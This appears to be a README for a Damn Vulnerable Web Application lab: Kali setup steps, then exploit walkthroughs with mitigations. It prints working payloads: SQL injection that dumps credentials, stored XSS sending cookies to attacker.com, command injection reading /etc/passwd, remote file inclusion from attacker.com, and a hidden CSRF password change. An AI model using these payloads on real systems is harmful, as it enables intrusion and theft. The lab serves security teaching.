This repository serves as a comprehensive educational guide for the Damn Vulnerable Web Application (DVWA). It provides step-by-step instructions for installation on Kali Linux, detailed walkthroughs for various vulnerability modules, and professional mitigation strategies.Disclaimer: This project is for educational purposes only. Do not perform these attacks on any system you do not have explicit permission to test.🛠 

1. Environment Setup (Kali Linux)DVWA requires a LAMP (Linux, Apache, MySQL/MariaDB, PHP) stack. Follow these steps to set up the environment on a Kali Linux machine.Phase 1: Dependencies & Services# Update system packages
sudo apt update && sudo apt upgrade -y

# Install Apache, MariaDB, and PHP modules
sudo apt install apache2 mariadb-server php php-mysqli php-gd libapache2-mod-php -y

Phase 2: Application Deployment# Clone the repository into the web root
cd /var/www/html
sudo git clone [https://github.com/digininja/DVWA.git](https://github.com/digininja/DVWA.git)

# Set permissions (Critical for File Upload & Logging)
sudo chown -R www-data:www-data /var/www/html/DVWA
sudo chmod -R 777 /var/www/html/DVWA/hackable/uploads/

Phase 3: Database ConfigurationStart the services: sudo systemctl start apache2 mariadbConfigure MariaDB: sudo mysql -u rootExecute SQL:CREATE DATABASE dvwa;
CREATE USER 'dvwa_user'@'localhost' IDENTIFIED BY 'password123';
GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa_user'@'localhost';
FLUSH PRIVILEGES;
EXIT;

Phase 4: DVWA Config Connectioncd /var/www/html/DVWA/configsudo cp config.inc.php.dist config.inc.phpEdit config.inc.php:$_DVWA[ 'db_user' ] = 'dvwa_user';$_DVWA[ 'db_password' ] = 'password123';Visit http://127.0.0.1/DVWA/setup.php and click "Create / Reset Database".🚀 2. Execution of Vulnerability ModulesSet DVWA Security level to Low for initial testing.A. SQL Injection (SQLi)Objective: Bypass authentication or dump the user database.Test for Vulnerability: Input ' in the User ID field. A syntax error confirms vulnerability.Enumerate Columns: ' UNION SELECT 1, 2 #Extract Data:Database Name: ' UNION SELECT 1, database() #Credentials: ' UNION SELECT user, password FROM users #Mitigation: Use Prepared Statements (PDO in PHP) to separate code from data.B. Cross-Site Scripting (XSS)1. Reflected XSSPayload: <script>alert(document.cookie)</script>Execution: Enter the payload into the "Name" field. The script reflects back and executes in the browser.2. Stored XSSPayload: <script>document.location='http://attacker.com/steal?c='+document.cookie</script>Execution: Post this in the Guestbook. Every user who visits the page will unknowingly send their session cookie to the attacker.Mitigation: Use htmlspecialchars() to encode output and implement a strict Content Security Policy (CSP).C. Command InjectionObjective: Execute OS-level commands via the web interface.Payload: 127.0.0.1; ls -la; cat /etc/passwdExecution: The ; acts as a command separator, allowing the attacker to run unauthorized commands.Mitigation: Use shell escaping functions like escapeshellarg() or avoid shell execution entirely.D. File Inclusion (LFI/RFI)LFI (Local): ?page=../../../../etc/passwd (Reads local system files).RFI (Remote): ?page=http://attacker.com/shell.txt (Executes remote code).Mitigation: Disable allow_url_include in php.ini and use a whitelist for file paths.E. Cross-Site Request Forgery (CSRF)Objective: Force a user to change their password without their knowledge.Payload:<img src="[http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change](http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change)" style="display:none;">
Execution: Host this HTML on an external site. If a logged-in DVWA user visits it, their password changes automatically.Mitigation: Implement Anti-CSRF Tokens for every state-changing request.

🛡 3. Web Security HardeningHTTP Security HeadersAnalyze your site using securityheaders.com. Add these to your Apache configuration to harden the server:Strict-Transport-Security (HSTS): Enforces HTTPS.X-Content-Type-Options: Prevents MIME-sniffing.X-Frame-Options: Prevents Clickjacking.Content-Security-Policy: Mitigates XSS.Burp Suite Advanced TestingIntercept/Modify: Use the Proxy tab to modify requests before they reach the server.Fuzzing: Use Intruder with a wordlist (e.g., RockYou.txt) to brute-force login credentials by targeting the password parameter.
